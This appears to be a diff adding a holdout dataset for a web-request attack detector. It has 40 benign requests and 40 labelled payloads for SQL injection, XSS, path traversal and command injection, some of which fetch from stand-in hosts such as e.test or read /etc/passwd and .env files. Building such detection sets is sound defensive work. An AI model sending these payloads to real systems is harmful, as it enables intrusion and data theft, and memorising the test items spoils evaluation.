@@ -1,0 +1,834 @@
+[
+  {
+    "id": "hb1",
+    "label": "benign",
+    "method": "GET",
+    "url": "/products?id=7&sort=rating",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb2",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/items?page=5&limit=10",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb3",
+    "label": "benign",
+    "method": "GET",
+    "url": "/search?q=mechanical+keyboard",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb4",
+    "label": "benign",
+    "method": "GET",
+    "url": "/search?q=student+union+events",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb5",
+    "label": "benign",
+    "method": "GET",
+    "url": "/categories?name=toys",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb6",
+    "label": "benign",
+    "method": "GET",
+    "url": "/orders?page=3",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb7",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/users?id=402",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb8",
+    "label": "benign",
+    "method": "GET",
+    "url": "/articles?tag=networking",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb9",
+    "label": "benign",
+    "method": "GET",
+    "url": "/blog/2026/04/exam-schedule",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb10",
+    "label": "benign",
+    "method": "GET",
+    "url": "/static/img/banner.jpg",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb11",
+    "label": "benign",
+    "method": "GET",
+    "url": "/static/js/vendor.js?v=9",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb12",
+    "label": "benign",
+    "method": "GET",
+    "url": "/robots.txt",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb13",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/health",
+    "headers": {
+      "user-agent": "curl/8.4.0",
+      "accept": "*/*"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb14",
+    "label": "benign",
+    "method": "GET",
+    "url": "/events?city=alexandria&date=2026-06-01",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb15",
+    "label": "benign",
+    "method": "GET",
+    "url": "/courses?level=advanced",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb16",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/products?category=tablets&max=500",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb17",
+    "label": "benign",
+    "method": "GET",
+    "url": "/docs/api-reference",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb18",
+    "label": "benign",
+    "method": "GET",
+    "url": "/cart?item=44",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb19",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/messages?unread=1",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "application/json",
+      "x-requested-with": "XMLHttpRequest"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb20",
+    "label": "benign",
+    "method": "GET",
+    "url": "/search?q=how+to+select+a+laptop",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb21",
+    "label": "benign",
+    "method": "GET",
+    "url": "/support?topic=return+drop+off",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb22",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/lookup?code=CAI-77",
+    "headers": {
+      "user-agent": "curl/8.4.0",
+      "accept": "*/*"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb23",
+    "label": "benign",
+    "method": "GET",
+    "url": "/?utm_source=newsletter",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb24",
+    "label": "benign",
+    "method": "GET",
+    "url": "/gallery?album=3",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb25",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/v1/books?title=the+thief+and+the+dogs",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb26",
+    "label": "benign",
+    "method": "GET",
+    "url": "/profile/settings",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb27",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/prices?currency=egp&date=2026-05-10",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb28",
+    "label": "benign",
+    "method": "GET",
+    "url": "/about",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb29",
+    "label": "benign",
+    "method": "GET",
+    "url": "/contact?subject=hello",
+    "headers": {},
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb30",
+    "label": "benign",
+    "method": "GET",
+    "url": "/api/weather?city=aswan",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Holdout benign GET"
+  },
+  {
+    "id": "hb31",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/orders",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"productId\":5,\"quantity\":3}",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hb32",
+    "label": "benign",
+    "method": "POST",
+    "url": "/signup",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "name=Layla+Samir&email=layla%40example.com",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hb33",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/reviews",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"productId\":2,\"stars\":5,\"text\":\"Arrived early, works well.\"}",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hb34",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/search",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"query\":\"desk lamp\"}",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hb35",
+    "label": "benign",
+    "method": "POST",
+    "url": "/login",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "username=student9&password=Plain+Pass+12",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hb36",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/profile/name",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"displayName\":\"Dana D'Souza\"}",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hb37",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/booking",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"room\":\"C3\",\"date\":\"2026-06-09\"}",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hb38",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/tickets",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "subject=Wifi&body=The+connection+drops+every+hour",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hb39",
+    "label": "benign",
+    "method": "POST",
+    "url": "/api/feedback",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"rating\":4,\"message\":\"Please add dark mode.\"}",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hb40",
+    "label": "benign",
+    "method": "POST",
+    "url": "/newsletter",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "email=karim%40example.com",
+    "description": "Holdout benign POST"
+  },
+  {
+    "id": "hm1",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/items?id=1' OR 'a'='a",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm2",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/user?name=x'/**/UNION/**/SELECT/**/1,2--",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm3",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/list?o=1;SELECT pg_sleep(3)",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm4",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/api/u?id=9 AND 1=2 UNION ALL SELECT null,null",
+    "headers": {
+      "accept": "application/json"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm5",
+    "label": "sql_injection",
+    "method": "POST",
+    "url": "/login",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "username=admin'--&password=x",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm6",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/p?id=5'; DROP TABLE orders;--",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm7",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/s?q=1 OR 1=1",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm8",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/a?id=1' AND SLEEP(4)--",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm9",
+    "label": "sql_injection",
+    "method": "POST",
+    "url": "/api/f",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"v\":\"x' OR '1'='1\"}",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm10",
+    "label": "sql_injection",
+    "method": "GET",
+    "url": "/o?id=-1 UNION SELECT table_name FROM information_schema.tables",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm11",
+    "label": "xss",
+    "method": "GET",
+    "url": "/c?t=<script>alert(document.domain)</script>",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm12",
+    "label": "xss",
+    "method": "GET",
+    "url": "/c?t=<img src=1 onerror=alert(1)>",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm13",
+    "label": "xss",
+    "method": "GET",
+    "url": "/c?t=%3Csvg%20onload=alert(1)%3E",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm14",
+    "label": "xss",
+    "method": "POST",
+    "url": "/api/m",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"t\":\"<script>fetch('//x.test')</script>\"}",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm15",
+    "label": "xss",
+    "method": "GET",
+    "url": "/r?u=javascript:alert(1)",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm16",
+    "label": "xss",
+    "method": "GET",
+    "url": "/s?q=\"><script>alert(1)</script>",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm17",
+    "label": "xss",
+    "method": "GET",
+    "url": "/n?x=<body onload=alert(1)>",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm18",
+    "label": "xss",
+    "method": "POST",
+    "url": "/p",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "bio=<iframe src=javascript:alert(1)>",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm19",
+    "label": "xss",
+    "method": "GET",
+    "url": "/v?h=<a href=javascript:alert(1)>x</a>",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm20",
+    "label": "xss",
+    "method": "GET",
+    "url": "/w?m=%3Cscript%3Eeval(atob('YQ=='))%3C/script%3E",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm21",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/d?f=../../../etc/passwd",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm22",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/d?f=..%2f..%2f..%2fetc%2fpasswd",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm23",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/d?f=..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm24",
+    "label": "path_traversal",
+    "method": "POST",
+    "url": "/api/r",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"p\":\"../../../../etc/shadow\"}",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm25",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/d?f=%2e%2e%2f%2e%2e%2fboot.ini",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm26",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/t?n=....//....//etc/passwd",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm27",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/f?p=/etc/passwd",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm28",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/f?p=..%252f..%252fsecret",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm29",
+    "label": "path_traversal",
+    "method": "POST",
+    "url": "/u",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "path=../../app/.env",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm30",
+    "label": "path_traversal",
+    "method": "GET",
+    "url": "/a?path=../../../../var/log/syslog",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm31",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/ping?h=1.1.1.1;id",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm32",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/ping?h=1.1.1.1 && cat /etc/passwd",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm33",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/ping?h=`id`",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm34",
+    "label": "command_injection",
+    "method": "POST",
+    "url": "/api/x",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"h\":\"a.com | whoami\"}",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm35",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/run?c=ls -la /",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm36",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/r?x=1.1.1.1%3Bwget%20http://e.test/a.sh",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm37",
+    "label": "command_injection",
+    "method": "POST",
+    "url": "/t",
+    "headers": {
+      "content-type": "application/x-www-form-urlencoded"
+    },
+    "body": "host=x; uname -a",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm38",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/d?t=8.8.8.8||curl http://e.test",
+    "headers": {
+      "user-agent": "Mozilla/5.0",
+      "accept": "text/html"
+    },
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm39",
+    "label": "command_injection",
+    "method": "GET",
+    "url": "/d?t=$(cat /etc/passwd)",
+    "headers": {},
+    "body": "",
+    "description": "Holdout malicious"
+  },
+  {
+    "id": "hm40",
+    "label": "command_injection",
+    "method": "POST",
+    "url": "/api/y",
+    "headers": {
+      "content-type": "application/json"
+    },
+    "body": "{\"t\":\"x; powershell -enc AAAA\"}",
+    "description": "Holdout malicious"
+  }
+]
